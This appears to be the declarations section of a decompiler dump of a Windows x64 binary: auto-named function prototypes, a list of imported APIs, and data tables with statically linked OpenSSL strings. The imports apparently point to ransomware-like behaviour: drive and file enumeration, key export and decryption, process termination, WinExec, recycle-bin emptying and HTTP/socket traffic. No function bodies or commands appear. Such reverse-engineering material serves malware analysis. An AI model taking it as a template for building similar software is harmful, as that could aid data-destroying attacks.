__int64 *__fastcall sub_1400BEA20(_BYTE *a1, int a2);
void *sub_1400BEAF0();
__int64 __fastcall sub_1400BEB00(__int64 a1, int a2);
__int64 __fastcall sub_1400BEBB0(__int64 a1);
__int64 __fastcall sub_1400BEC30(__int64 a1, int a2);
__int64 __fastcall sub_1400BED30(__int64 a1, __int64 a2, unsigned int a3);
unsigned int __fastcall sub_1400BED40(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_1400BED70(__int64 a1, int a2);
__int64 __fastcall sub_1400BEDD0(__int64 a1);
_BOOL8 __fastcall sub_1400BEDF0(__int64 a1);
void *sub_1400BEE00();
__int64 __fastcall sub_1400BEE10(__int64 a1, __int64 a2, signed int a3);
__int64 __fastcall sub_1400BEEF0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_1400BEFB0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400BF010(__int64 a1, unsigned int a2, unsigned int a3, int *a4);
__int64 __fastcall sub_1400BF240(__int64 a1);
__int64 __fastcall sub_1400BF2A0(__int64 a1);
_QWORD *__fastcall sub_1400BF2F0(__int64 a1, unsigned int a2, __int64 a3);
void *sub_1400BF340();
_BOOL8 __fastcall sub_1400BF350(__int64 a1, int *a2, int a3);
__int64 __fastcall sub_1400BF4B0(__int64 a1);
__int64 __fastcall sub_1400BF4D0(__int64 a1, char *a2, int a3);
__int64 __fastcall sub_1400BF670(__int64 a1, char *a2, int a3);
__int64 __fastcall sub_1400BF930(__int64 a1, unsigned int a2, unsigned int a3, _QWORD *a4);
__int64 __fastcall sub_1400BFC50(__int64 a1);
__int64 __fastcall sub_1400BFD00(__int64 a1);
void *sub_1400BFD90();
__int64 __fastcall sub_1400BFDA0(__int64 a1);
__int64 __fastcall sub_1400BFFD0(__int64 a1, unsigned int a2, int a3, __int64 a4);
__int64 __fastcall sub_1400BFFF0(__int64 **a1, __int64 *a2);
__int64 __fastcall sub_1400C00E0(__int64 a1, __int64 a2);
__int64 *__fastcall sub_1400C05D0(__int64 a1, __int64 a2);
int **__fastcall sub_1400C0A40(__int64 *a1, int *a2, int a3);
__int64 __fastcall sub_1400C0B20(__int64 a1);
__int64 __fastcall sub_1400C0B80(int **a1, unsigned int a2, int a3, __int64 a4);
_BOOL8 __fastcall sub_1400C0C90(__int64 a1, __int64 *a2);
__int64 *__fastcall sub_1400C0DB0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400C0F30(__int64 a1, __int64 a2, char a3);
__int64 __fastcall sub_1400C0F50(__int64 a1, __int64 a2, char a3);
__int64 __fastcall sub_1400C0F70(__int64 a1, __int64 a2, char a3);
__int64 __fastcall sub_1400C0FC0(int a1, __int64 a2, char a3);
void *sub_1400C10E0();
void *sub_1400C10F0();
int *__fastcall sub_1400C1100(__int64 a1, unsigned int *a2, int *a3);
int *__fastcall sub_1400C12E0(__int64 a1, __int64 a2, unsigned int *a3);
void __fastcall sub_1400C1530(unsigned int *a1);
__int64 __fastcall sub_1400C1550(__int64 a1, __int64 a2, int a3, __int64 a4, int a5, int a6);
__int64 __fastcall sub_1400C15F0(__int64 a1, __int64 a2, int a3, __int64 a4, int a5, int a6, void *a7);
void __fastcall sub_1400C1690(__int64 a1);
__int64 __fastcall sub_1400C16F0(__int64 a1);
__int64 __fastcall sub_1400C1700(__int64 a1);
__int64 __fastcall sub_1400C1720(__int64 a1);
__int64 *sub_1400C1730();
__int64 *__fastcall sub_1400C1750(__int64 a1);
__int64 __fastcall sub_1400C1850(__int64 a1);
__int64 __fastcall sub_1400C19F0(__int64 a1, __int64 a2, _BYTE *a3);
void __fastcall sub_1400C1C00(void **a1);
_QWORD *__fastcall sub_1400C1C90(__int64 a1, __int64 a2, int a3, int a4, int a5, __int64 a6);
__int64 __fastcall sub_1400C1D70(__int64 a1, __int64 a2, __int64 *a3);
void *sub_1400C1DE0();
void *sub_1400C1DF0();
int *__fastcall sub_1400C1E00(__int64 a1, __int64 a2, unsigned int *a3);
int *__fastcall sub_1400C2010(__int64 a1, unsigned int *a2, int *a3);
void __fastcall sub_1400C20E0(unsigned int *a1);
int *__fastcall sub_1400C2100(__int64 a1, __int64 a2, unsigned int *a3);
int *__fastcall sub_1400C22D0(__int64 a1, __int64 a2, int *a3);
void *sub_1400C2340();
int *__fastcall sub_1400C2350(__int64 a1, __int64 a2, unsigned int *a3);
int *__fastcall sub_1400C2480(__int64 a1, unsigned int *a2, int *a3);
__int64 __fastcall sub_1400C2530(__int64 a1, __int64 *a2, __int64 a3, unsigned int a4);
void *sub_1400C25E0();
void *sub_1400C25F0();
void *sub_1400C2600();
__int64 __fastcall sub_1400C2610(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 __fastcall sub_1400C2700(__int64 a1, __int64 a2, unsigned int *a3);
__int64 __fastcall sub_1400C27C0(__int64 *a1, __int64 a2, _BYTE *a3, int a4);
__int64 __fastcall sub_1400C29C0(__int64 a1, __int64 a2);
_BYTE *__fastcall sub_1400C2A40(__int64 a1, const void **a2);
_DWORD *__fastcall sub_1400C2AE0(__int64 a1, __int64 a2, _BYTE *a3);
_DWORD *__fastcall sub_1400C2BB0(__int64 a1, __int64 a2, char *a3);
_BYTE *__fastcall sub_1400C2D50(__int64 a1, __int64 a2);
_DWORD *__fastcall sub_1400C2D70(__int64 a1, __int64 a2, char *a3);
int *__fastcall sub_1400C2E00(__int64 a1, __int64 a2, int *a3);
__int64 __fastcall sub_1400C2ED0(__int64 a1, __int64 a2, unsigned int *a3);
_DWORD *__fastcall sub_1400C3200(__int64 a1, __int64 a2, char *a3);
_WORD *__fastcall sub_1400C3220(__int64 a1, int *a2);
_BOOL8 __fastcall sub_1400C32A0(__int64 a1, __int64 *a2, __int64 a3, unsigned int a4);
_BOOL8 __fastcall sub_1400C33E0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
_BOOL8 __fastcall sub_1400C3450(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
_DWORD *sub_1400C34C0();
__int64 __fastcall sub_1400C34E0(const void **a1, void **a2);
_DWORD *__fastcall sub_1400C3530(_QWORD *a1, _BYTE **a2, int a3);
void __fastcall sub_1400C35E0(__int64 a1);
_BOOL8 __fastcall sub_1400C3600(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 sub_1400C3670();
__int64 __fastcall sub_1400C3690(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 __fastcall sub_1400C37A0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 __fastcall sub_1400C3890(__int64 a1, __int64 a2, _BYTE *a3);
__int64 __fastcall sub_1400C3B30(_QWORD *a1, char ***a2, _QWORD *a3, __int64 *a4);
void *sub_1400C40E0();
__int64 __fastcall sub_1400C4110(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4);
unsigned int *__fastcall sub_1400C4150(int **a1, unsigned __int8 **a2, unsigned int a3);
unsigned int *__fastcall sub_1400C41B0(int **a1, unsigned __int8 **a2, unsigned int a3);
__int64 __fastcall sub_1400C4210(unsigned int *a1, int a2);
int *__fastcall sub_1400C4290(__int64 a1, unsigned int *a2, int *a3);
int *__fastcall sub_1400C4360(__int64 a1, __int64 a2, unsigned int *a3);
void *sub_1400C4580();
void *sub_1400C4590();
void *sub_1400C45A0();
void *sub_1400C45B0();
void *sub_1400C45C0();
void *sub_1400C45D0();
void *sub_1400C45E0();
void *sub_1400C45F0();
void *sub_1400C4600();
void *sub_1400C4610();
void *sub_1400C4620();
void *sub_1400C4630();
void *sub_1400C4640();
void *sub_1400C4650();
void *sub_1400C4660();
void *sub_1400C4670();
void *sub_1400C4680();
void *sub_1400C4690();
__int64 __fastcall sub_1400C46A0(__int64 a1, _DWORD *a2);
__int64 __fastcall sub_1400C4710(__int64 a1, _BYTE *a2, int a3);
__int64 __fastcall sub_1400C47A0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400C49C0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_1400C4A10(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400C4A40(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_1400C4A90(__int64 a1, unsigned int a2, unsigned int a3, _QWORD *a4);
__int64 __fastcall sub_1400C4CD0(__int64 a1);
__int64 __fastcall sub_1400C4D80(__int64 a1);
__int64 __fastcall sub_1400C4E10(__int64 a1, __int64 a2, void (__fastcall *a3)(__int64, __int64, __int64, __int64), int a4);
__int64 __fastcall sub_1400C4F00(__int64 a1, _DWORD *a2, unsigned int (__fastcall *a3)(__int64, _DWORD *, _DWORD *, _DWORD *), int a4, int a5);
__int64 __fastcall sub_1400C4F80(__int64 a1, char *a2, int a3);
__int64 __fastcall sub_1400C5150(__int64 a1, char *a2, signed int a3);
__int64 __fastcall sub_1400C52B0(__int64 a1, char *a2);
__int64 __fastcall sub_1400C5300(__int64 a1, _BYTE *a2, int a3);
__int64 __fastcall sub_1400C5410(__int64 a1, unsigned int a2, int a3, _QWORD *a4);
__int64 __fastcall sub_1400C5810(__int64 a1);
__int64 __fastcall sub_1400C5900(__int64 a1);
__int64 __fastcall sub_1400C5990(__int64 a1, unsigned int a2, __int64 a3);
__int64 __fastcall sub_1400C59C0(__int64 a1, char *a2, int a3);
__int64 __fastcall sub_1400C5E20(__int64 a1, char *a2, int a3);
__int64 __fastcall sub_1400C62C0(__int64 a1, char *a2);
__int64 __fastcall sub_1400C6310(__int64 a1, unsigned int a2, unsigned int a3, __int64 a4);
__int64 __fastcall sub_1400C65A0(__int64 a1);
__int64 __fastcall sub_1400C6640(__int64 a1);
__int64 __fastcall sub_1400C66C0(__int64 a1, unsigned int *a2);
__int64 __fastcall sub_1400C6850(__int64 a1, __FrameHandler3::TryBlockMap *a2);
__int64 __fastcall sub_1400C68A0(__int64 a1);
__int64 __fastcall sub_1400C6950(__int64 a1);
char **sub_1400C69B0();
_crt_signal_t __fastcall sub_1400C69C0();
void (__cdecl *__fastcall sub_1400C6A40())(int);
__int64 __fastcall sub_1400C6AE0(__int64 a1, __int64 a2, int a3, int a4);
__int64 __fastcall sub_1400C6E30(__int64 a1);
void __fastcall sub_1400C6EB0(int a1);
__int64 __fastcall sub_1400C6EC0(__int64 a1, __int64 a2);
void __fastcall sub_1400C6FD0(void *a1);
void __fastcall sub_1400C6FF0(void **a1);
__int64 __fastcall sub_1400C7080(__int64 a1);
_BOOL8 __fastcall sub_1400C70B0(__int64 a1);
_DWORD *__fastcall sub_1400C7100();
__int64 __fastcall sub_1400C7160(__int64 a1, const void *a2, size_t a3);
__int64 __fastcall sub_1400C7220(_DWORD *a1, int a2);
_BOOL8 __fastcall sub_1400C7260(__int64 a1);
__int64 __fastcall sub_1400C7290(int **a1, unsigned __int8 **a2, unsigned int a3);
__int64 __fastcall sub_1400C7330(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_1400C73A0(__int64 a1, _BYTE **a2);
__int64 __fastcall sub_1400C7550(unsigned int *a1, void **a2);
__int64 __fastcall sub_1400C77A0(__int64 a1, _BYTE **a2);
__int64 __fastcall sub_1400C78B0(void ***a1, unsigned __int8 **a2, size_t a3);
int *__fastcall sub_1400C7AD0(int **a1, unsigned __int8 **a2, __int64 a3);
__int64 __fastcall sub_1400C7CC0(__int64 a1, _BYTE **a2, unsigned __int64 a3);
__int64 __fastcall sub_1400C7E20(unsigned int *a1, __int64 a2, unsigned int a3, const char *a4, unsigned int **a5);
void __fastcall sub_1400C80D0(unsigned __int64 a1, __int64 a2);
__int64 __fastcall sub_1400C81F0(unsigned int **a1, const void *a2, size_t a3);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// char *__cdecl strrchr(const char *Str, int Ch);
// wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr);
void *__cdecl j__realloc_base(void *Block, size_t Size);
// __time64_t __cdecl time64(__time64_t *Time);
__int64 __fastcall common_getenv<char>(char *String2); // idb
// int __cdecl strcmp(const char *Str1, const char *Str2);
// errno_t __cdecl strerror_s(char *Buffer, size_t SizeInBytes, int ErrorNumber);
// __int64 __fastcall unknown_libname_30(_QWORD, _QWORD); weak
// __int64 __fastcall unknown_libname_31(_QWORD, _QWORD); weak
// int __cdecl stricmp(const char *String1, const char *String2);
// int __cdecl _stdio_common_vsscanf(unsigned __int64 Options, const char *Buffer, size_t BufferCount, const char *Format, _locale_t Locale, va_list ArgList);
// struct tm *__cdecl gmtime64(const __time64_t *Time);
// int __cdecl fputs(const char *Buffer, FILE *Stream);
char **sub_1400CE2C0();
const char *sub_1400CE2C8();

//-------------------------------------------------------------------------
// Data declarations

// extern HANDLE (__stdcall *RegisterEventSourceW)(LPCWSTR lpUNCServerName, LPCWSTR lpSourceName);
// extern BOOL (__stdcall *ReportEventW)(HANDLE hEventLog, WORD wType, WORD wCategory, DWORD dwEventID, PSID lpUserSid, WORD wNumStrings, DWORD dwDataSize, LPCWSTR *lpStrings, LPVOID lpRawData);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *CryptDestroyKey)(HCRYPTKEY hKey);
// extern BOOL (__stdcall *CryptSetHashParam)(HCRYPTHASH hHash, DWORD dwParam, const BYTE *pbData, DWORD dwFlags);
// extern BOOL (__stdcall *DeregisterEventSource)(HANDLE hEventLog);
// extern BOOL (__stdcall *CryptGetProvParam)(HCRYPTPROV hProv, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags);
// extern BOOL (__stdcall *CryptGetUserKey)(HCRYPTPROV hProv, DWORD dwKeySpec, HCRYPTKEY *phUserKey);
// extern BOOL (__stdcall *CryptExportKey)(HCRYPTKEY hKey, HCRYPTKEY hExpKey, DWORD dwBlobType, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
// extern BOOL (__stdcall *CryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
// extern BOOL (__stdcall *CryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
// extern BOOL (__stdcall *CryptDestroyHash)(HCRYPTHASH hHash);
// extern BOOL (__stdcall *CryptSignHashW)(HCRYPTHASH hHash, DWORD dwKeySpec, LPCWSTR szDescription, DWORD dwFlags, BYTE *pbSignature, DWORD *pdwSigLen);
// extern BOOL (__stdcall *CryptEnumProvidersW)(DWORD dwIndex, DWORD *pdwReserved, DWORD dwFlags, DWORD *pdwProvType, LPWSTR szProvName, DWORD *pcbProvName);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegOpenKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern PCCERT_CONTEXT (__stdcall *CertDuplicateCertificateContext)(PCCERT_CONTEXT pCertContext);
// extern PCCERT_CONTEXT (__stdcall *CertFindCertificateInStore)(HCERTSTORE hCertStore, DWORD dwCertEncodingType, DWORD dwFindFlags, DWORD dwFindType, const void *pvFindPara, PCCERT_CONTEXT pPrevCertContext);
// extern PCCERT_CONTEXT (__stdcall *CertEnumCertificatesInStore)(HCERTSTORE hCertStore, PCCERT_CONTEXT pPrevCertContext);
// extern BOOL (__stdcall *CertFreeCertificateContext)(PCCERT_CONTEXT pCertContext);
// extern BOOL (__stdcall *CertCloseStore)(HCERTSTORE hCertStore, DWORD dwFlags);
// extern HCERTSTORE (__stdcall *CertOpenStore)(LPCSTR lpszStoreProvider, DWORD dwEncodingType, HCRYPTPROV_LEGACY hCryptProv, DWORD dwFlags, const void *pvPara);
// extern BOOL (__stdcall *CertGetCertificateContextProperty)(PCCERT_CONTEXT pCertContext, DWORD dwPropId, void *pvData, DWORD *pcbData);
// extern BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern BOOL (__stdcall *Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern UINT (__stdcall *WinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
// extern DWORD (__stdcall *GetTickCount)();
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *ExpandEnvironmentStringsW)(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern BOOL (__stdcall *GetConsoleMode)(HANDLE hConsoleHandle, LPDWORD lpMode);
// extern BOOL (__stdcall *ReadConsoleW)(HANDLE hConsoleInput, LPVOID lpBuffer, DWORD nNumberOfCharsToRead, LPDWORD lpNumberOfCharsRead, PCONSOLE_READCONSOLE_CONTROL pInputControl);
// extern void (__stdcall *DeleteFiber)(LPVOID lpFiber);
// extern BOOL (__stdcall *ConvertFiberToThread)();
// extern void (__stdcall *GlobalMemoryStatus)(LPMEMORYSTATUS lpBuffer);
// extern DWORD (__stdcall *GetEnvironmentVariableW)(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
// extern BOOL (__stdcall *ReadConsoleA)(HANDLE hConsoleInput, LPVOID lpBuffer, DWORD nNumberOfCharsToRead, LPDWORD lpNumberOfCharsRead, PCONSOLE_READCONSOLE_CONTROL pInputControl);
// extern BOOL (__stdcall *SetConsoleMode)(HANDLE hConsoleHandle, DWORD dwMode);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern HRESULT (__stdcall *SHEmptyRecycleBinW)(HWND hwnd, LPCWSTR pszRootPath, DWORD dwFlags);
// extern int (*wsprintfW)(LPWSTR, LPCWSTR, ...);
// extern BOOL (__stdcall *GetUserObjectInformationW)(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded);
// extern int (__stdcall *MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
// extern HWINSTA (__stdcall *GetProcessWindowStation)();
// extern HINTERNET (__stdcall *HttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
// extern BOOL (__stdcall *InternetCloseHandle)(HINTERNET hInternet);
// extern BOOL (__stdcall *HttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
// extern HINTERNET (__stdcall *InternetConnectA)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
// extern HINTERNET (__stdcall *InternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
// extern int (__stdcall *WSACleanup)();
// extern int (__stdcall *WSAGetLastError)();
// extern int (__stdcall *recv)(SOCKET s, char *buf, int len, int flags);
// extern int (__stdcall *send)(SOCKET s, const char *buf, int len, int flags);
// extern void (__stdcall *WSASetLastError)(int iError);
// extern int (__stdcall *closesocket)(SOCKET s);
_UNKNOWN unk_1400D75D8; // weak
char a0123456789abcd[17] = "0123456789ABCDEF"; // weak
char byte_1400D7DAE[2] = { '\0', '\0' }; // weak
void *off_1400D7F78 = &unk_1400D7F70; // weak
unsigned __int8 byte_1400D7F90[256] =
{
  0u,
  1u,
  2u,
  2u,
  3u,
  3u,
  3u,
  3u,
  4u,
  4u,
  4u,
  4u,
  4u,
  4u,
  4u,
  4u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  5u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  6u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  7u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u,
  8u
}; // weak
_UNKNOWN unk_1400DA6D0; // weak
char *off_1400DD3A0 = "OpenSSL EC_KEY method"; // weak
char a0123456789[11] = "0123456789"; // weak
char aPkcs1[6] = "pkcs1"; // weak
_UNKNOWN unk_1400E0F40; // weak
_UNKNOWN unk_1400E1FB0; // weak
_UNKNOWN unk_1400E3020; // weak
char *off_1400E5980[2] = { "UNDEF", "undefined" }; // weak
char aPss[4] = "pss"; // weak
char aInfo[5] = "info"; // weak
_UNKNOWN unk_1400F37F0; // weak
char aSeed_0[5] = "seed"; // weak
char aDynamic[8] = "dynamic"; // weak
_UNKNOWN unk_1400F3C50; // weak
_UNKNOWN unk_1400F3F90; // weak
char *off_1400F51E0 = "\a"; // weak
_UNKNOWN unk_1400F5350; // weak
char aCipher[7] = "cipher"; // weak
char aKey[4] = "key"; // weak
char aHexkey[7] = "hexkey"; // weak
char aSslv23[7] = "sslv23"; // weak
char aNone[5] = "none"; // weak
char aOeap[5] = "oeap"; // weak
char aOaep[5] = "oaep"; // weak
char aX931[5] = "x931"; // weak
char aSecret[7] = "secret"; // weak
char aHexseed[8] = "hexseed"; // weak
char aSalt[5] = "salt"; // weak
char aHexsalt[8] = "hexsalt"; // weak
char aHexinfo[8] = "hexinfo"; // weak
char a0123456789abcd_2[17] = "0123456789ABCDEF"; // weak
_UNKNOWN unk_1400F6430; // weak
_UNKNOWN unk_1400F65B0; // weak
_UNKNOWN unk_1400F66C0; // weak
_UNKNOWN unk_1400F6890; // weak
_UNKNOWN unk_1400F6A80; // weak
int dword_1400F6B3C = 1; // weak
__int16 word_1400F6B40[16] = { 58, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 4, 0, 0 }; // weak
_UNKNOWN unk_1400F6E10; // weak
int dword_1400F7B9C = 1; // weak
int dword_1400F7BE0[12] = { 1, 0, 0, 30, 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
_UNKNOWN unk_1400F7C18; // weak
_UNKNOWN unk_1400F7C48; // weak
_UNKNOWN unk_1400F7C78; // weak
_UNKNOWN unk_1400F7CA8; // weak
_UNKNOWN unk_1400F7CD8; // weak
_UNKNOWN unk_1400F7D08; // weak
_UNKNOWN unk_1400F7D38; // weak
_UNKNOWN unk_1400F7D68; // weak
_UNKNOWN unk_1400F7DC8; // weak
_UNKNOWN unk_1400F7DF8; // weak
_UNKNOWN unk_1400F7E48; // weak
_UNKNOWN unk_1400F7E98; // weak
_UNKNOWN unk_1400F7EC8; // weak
_UNKNOWN unk_1400F7EF8; // weak
_UNKNOWN unk_1400F7F28; // weak
_UNKNOWN unk_1400F7F58; // weak
_UNKNOWN unk_1400F7F88; // weak
_UNKNOWN unk_1400F8018; // weak
_UNKNOWN unk_1400F80A8; // weak
int dword_1400F8354 = 1; // weak
int dword_1400F83F0[32] =
{
  0,
  0,
  0,
  1024,
  512,
  0,
  0,
  4096,
  4096,
  4096,
  4096,
  4096,
  8192,
  4096,
  4096,
  4096,
  65536,
  0,
  1,
  2,
  4,
  8,
  16,
  16384,
  32768,
  32,
  64,
  128,
  256,
  4096,
  2048,
  4096
}; // weak
_UNKNOWN unk_1400F84F0; // weak
_UNKNOWN unk_1400F8550; // weak
_UNKNOWN unk_1400F85B0; // weak
_UNKNOWN unk_1400F8610; // weak
_UNKNOWN unk_1400F8670; // weak
_UNKNOWN unk_1400F86D0; // weak
_UNKNOWN unk_1400F8730; // weak
_UNKNOWN unk_1400F8790; // weak
_UNKNOWN unk_1400F87F0; // weak
